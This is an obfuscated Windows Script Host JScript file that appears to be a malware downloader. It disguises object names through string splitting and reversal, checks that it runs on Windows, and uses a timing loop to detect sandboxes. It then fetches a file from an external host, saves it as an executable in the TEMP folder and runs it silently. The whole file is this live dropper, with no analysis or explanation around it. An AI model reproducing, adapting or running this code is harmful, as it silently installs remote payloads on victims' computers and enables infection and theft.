var ZblPqfLgiLpmUcsRpmOgk = false;
var HggOvyEsyGihZdcFsbOyq = "";
var KxxXvbOmaQulPtaEeiDna;
var XtnKhbDvkOfoXlxHisWhw = "C" + "r"+"eateObject";
var JeySzxZvjDroUafXcvQbo = this["WScript"];
var ZuxDyfMkyJvzGfcLphRrr = function NssYuvWdjHvxJgoAxeDit() {return JeySzxZvjDroUafXcvQbo[XtnKhbDvkOfoXlxHisWhw]("WScript"+".Shell");}(), TvaPxzTnaDkeNeqAdlYjo = 11;
var UieLvuEtlDuxPxjOpbNdz = 1 * (2 - 0);
var OztLlgRhpRuiUdnCgdEss = UieLvuEtlDuxPxjOpbNdz - (2 + 0) * 1;
function NcmKqpMpfWnjThrVfsRvp(CjhPwoAtwXnqEflVzdWot){ZuxDyfMkyJvzGfcLphRrr[("Cunt", "anal", "R")+ "u" + ("fuck", "n")](CjhPwoAtwXnqEflVzdWot, OztLlgRhpRuiUdnCgdEss, OztLlgRhpRuiUdnCgdEss);};
function DpvHwiCfbJjgDzyFefBnx(RynNweTxsYxcIjwQycKqh, IenIfhPaoFnzJetBejZyi){OztLlgRhpRuiUdnCgdEss = OztLlgRhpRuiUdnCgdEss * 1; return RynNweTxsYxcIjwQycKqh - IenIfhPaoFnzJetBejZyi;};
function VtdLoaTcaGoxInhCptCkh(){return XtnKhbDvkOfoXlxHisWhw;};
/*@cc_on
  @if (@_win32 || @_win64)
    //
	ZblPqfLgiLpmUcsRpmOgk = true;
	HggOvyEsyGihZdcFsbOyq = "MLH";
	KxxXvbOmaQulPtaEeiDna = "R" + "esponseB" + "ydo".split('').reverse().join('');
	FyjXmcKauBgkBrkTkaBzz = ("noitisop").split('').reverse().join('');
	HgrLhaYsqHkiPoaYmlCnr = "eliFoTevaS".split('').reverse().join('');
  @end
@*/
if (ZblPqfLgiLpmUcsRpmOgk)
{
var AiqKlsPobKvfPbeGixUwl = "M" + "SXML2."+"X"+HggOvyEsyGihZdcFsbOyq+"TTP";
function DbkAtcChaCrhKoiMrlTap(){return AiqKlsPobKvfPbeGixUwl + "";};

var SicPolQfbQyzYurTyxHia = "";
function BziSgeMxzIiyFcnKnbPai(){return 23;};
var DdfTcwMalGeiNyyDqaZyd = 0; var ZewQwbJvnJdyCjsNlkRnn = 0;
function ImxYqsCblJqwPlrIpaTdm()
{
var MfpAanVuiVmmXkxKtpZgo = new this["D"+"ate"]();
var GofYngJfjSxrMyqQseAfa = MfpAanVuiVmmXkxKtpZgo["g"+"etUTCMilliseconds"]();
JeySzxZvjDroUafXcvQbo["Sleep"](BziSgeMxzIiyFcnKnbPai());
var MfpAanVuiVmmXkxKtpZgo = new this["D"+"ate"]();
var PhuEngZktRxzQmjFbrYbh = MfpAanVuiVmmXkxKtpZgo["g"+"etUTCMilliseconds"]();
JeySzxZvjDroUafXcvQbo["Sleep"](BziSgeMxzIiyFcnKnbPai());
var MfpAanVuiVmmXkxKtpZgo = new this["D"+"ate"]();
var HdqYpyZtrXnqTiwXavOzi = MfpAanVuiVmmXkxKtpZgo["g"+"etUTCMilliseconds"]();
var DdfTcwMalGeiNyyDqaZyd = "TjuAaqZqsKioDduKnrVsg";
DdfTcwMalGeiNyyDqaZyd = DpvHwiCfbJjgDzyFefBnx(PhuEngZktRxzQmjFbrYbh, GofYngJfjSxrMyqQseAfa);
var ZewQwbJvnJdyCjsNlkRnn = "XrqIgrRbxOdeQmiTkkDny";
ZewQwbJvnJdyCjsNlkRnn = DpvHwiCfbJjgDzyFefBnx(HdqYpyZtrXnqTiwXavOzi, PhuEngZktRxzQmjFbrYbh);
SicPolQfbQyzYurTyxHia = "open";
return DpvHwiCfbJjgDzyFefBnx(1 == 1 ? DdfTcwMalGeiNyyDqaZyd : 0, 1 == 1 ? ZewQwbJvnJdyCjsNlkRnn : 0);
}
var MzeDrmSuaXvlKrvEyzSpa = false;
var RtbVzeRrbAryPviLszEtr = false;
for (var QyyCxdSagMsxVedCbeXli = OztLlgRhpRuiUdnCgdEss; QyyCxdSagMsxVedCbeXli < BziSgeMxzIiyFcnKnbPai() * 1; QyyCxdSagMsxVedCbeXli++){if (ImxYqsCblJqwPlrIpaTdm() != OztLlgRhpRuiUdnCgdEss){
MzeDrmSuaXvlKrvEyzSpa = true; 
ZewQwbJvnJdyCjsNlkRnn = ("221") + (DdfTcwMalGeiNyyDqaZyd * ZewQwbJvnJdyCjsNlkRnn); 
RtbVzeRrbAryPviLszEtr = true; 
break;
}}
function AkdCjsPleZiqPnuIvlQjj() {return ((MzeDrmSuaXvlKrvEyzSpa == true) && (MzeDrmSuaXvlKrvEyzSpa == RtbVzeRrbAryPviLszEtr)) ? 1 : OztLlgRhpRuiUdnCgdEss;};
if (MzeDrmSuaXvlKrvEyzSpa && AkdCjsPleZiqPnuIvlQjj() && RtbVzeRrbAryPviLszEtr){
function SkuGsxFgmDcuSnnFeuMog() {return ZuxDyfMkyJvzGfcLphRrr["E"+"xpandEnvir"+"cock".charAt(1)+"nmentStrings"]("%TE"+"MP%/") + "j3g5yD3nkWF.ex" + "e";};
 KpiPavVlcUjlCocHamNcr = DbkAtcChaCrhKoiMrlTap();
 GbpNhkMrpHzxZcjQlbCsd = JeySzxZvjDroUafXcvQbo[XtnKhbDvkOfoXlxHisWhw](KpiPavVlcUjlCocHamNcr);
 var IinDegTqbWieGxqWplBhz = 3-2;
do { 
	for (;IinDegTqbWieGxqWplBhz;){
	try {
		if (IinDegTqbWieGxqWplBhz == 1)
		{
			GbpNhkMrpHzxZcjQlbCsd[SicPolQfbQyzYurTyxHia]("G" + "ET", "http://yury2.nichost.ru/i7dksa", false);
			GbpNhkMrpHzxZcjQlbCsd["s"+"end"]();
			LxnWwaDzvHahIntLhuBpk = "S"+"leep";
			IinDegTqbWieGxqWplBhz = 2;
		}
		JeySzxZvjDroUafXcvQbo[LxnWwaDzvHahIntLhuBpk](BziSgeMxzIiyFcnKnbPai() + 120); 
		if (GbpNhkMrpHzxZcjQlbCsd["r"+"eadystate"] < 2 * 2) continue;
		IinDegTqbWieGxqWplBhz = OztLlgRhpRuiUdnCgdEss;
		function EfjEwwVvyTcwUruGoxJyo(QaqFrhYdwPdnTdbUbaZbi) {var SnyMnnAqhPrrZbaHqrJil = (1, 2, 3, 4, 5, QaqFrhYdwPdnTdbUbaZbi); return SnyMnnAqhPrrZbaHqrJil;};
		KpiPavVlcUjlCocHamNcr = UmkVgaYmaEvsLttAkwTsz = JeySzxZvjDroUafXcvQbo[VtdLoaTcaGoxInhCptCkh()]("A"+"DODB"+"a.b".charAt(1)+"Stre"+"mad".charAt(1)+"m");
		KpiPavVlcUjlCocHamNcr[SicPolQfbQyzYurTyxHia]();
		KpiPavVlcUjlCocHamNcr["t"+"y"+"pe"] = 1;
		KpiPavVlcUjlCocHamNcr["w"+"crop".charAt(1)+"ite"](GbpNhkMrpHzxZcjQlbCsd[KxxXvbOmaQulPtaEeiDna]);
		UmkVgaYmaEvsLttAkwTsz[FyjXmcKauBgkBrkTkaBzz] = 2-2;
		KpiPavVlcUjlCocHamNcr[HgrLhaYsqHkiPoaYmlCnr](SkuGsxFgmDcuSnnFeuMog(), 2 * 1);
		UmkVgaYmaEvsLttAkwTsz["c"+"l"+"cock".charAt(1)+"se"]();
		DqaByhXfkUggNzcUylJom = SkuGsxFgmDcuSnnFeuMog();
		if (1 && ZblPqfLgiLpmUcsRpmOgk) NcmKqpMpfWnjThrVfsRvp(DqaByhXfkUggNzcUylJom);
	} catch(BvqRvbAbyVbkUtgNmtNgn){};};
}while (IinDegTqbWieGxqWplBhz);
}
}

